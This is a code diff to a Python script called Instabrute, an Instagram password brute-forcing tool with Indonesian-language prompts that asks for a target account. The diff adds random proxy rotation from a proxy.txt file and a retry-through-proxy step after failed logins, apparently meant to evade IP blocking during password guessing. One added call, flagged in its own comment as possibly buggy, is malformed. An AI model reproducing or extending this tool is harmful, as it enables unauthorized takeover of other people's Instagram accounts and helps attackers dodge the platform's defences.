@@ -35,6 +35,11 @@ class Instabrute():
 		self.IsUserExists()
 
 
+		UsePorxy = Input('[*] Apakah anda ingin menggunakan proxy ? (ketik n) (y/n): ').upper()
+		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
+                        self.randomProxy()
+			
+
 	#Check if password file exists and check if he contain passwords
 	def loadPasswords(self):
 		if os.path.isfile(self.passwordsFile):
@@ -51,8 +56,24 @@ class Instabrute():
 			print ('Tolong untuk membuat file password bernama "%s"' % self.passwordsFile)
 			Input('[*] Tekan enter untuk keluar')
 			exit()
+		
+        #Choose random proxy from proxys file
+	def randomProxy(self):
+		plist = open('proxy.txt').read().splitlines()
+		proxy = random.choice(plist)
 
+		if not proxy in self.UsedProxys:
+			self.CurrentProxy = proxy
+			self.UsedProxys.append(proxy)
+		try:
+			print('')
+			print('[*] Mengecek IP baru...')
+			print ('[*] IP publik mu: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
+		except Exception as e:
+			print  ('[*] Tak bisa mencapai proxy "%s"' % proxy)
+		print('')
 
+		
 	#Check if username exists in instagram server
 	def IsUserExists(self):
 		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
@@ -100,6 +121,12 @@ class Instabrute():
 		if (data['status'] == 'fail'):
 			print (data['message'])
 
+			UsePorxy = Input('[*] Apakah anda ingin menggunakan proxy ? (ketik n) (y/n): ').upper()
+			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
+				print ('[$] Try to use proxy after fail.')
+				randomProxy() #Check that, may contain bugs
+                        return False
+		
 		#return session if password is correct 
 		if (data['authenticated'] == True):
 			return sess 
@@ -110,6 +137,7 @@ class Instabrute():
 
 
 
+		
 instabrute = Instabrute(Input(' Masukkan Target IG Mu: '))
 
 try:
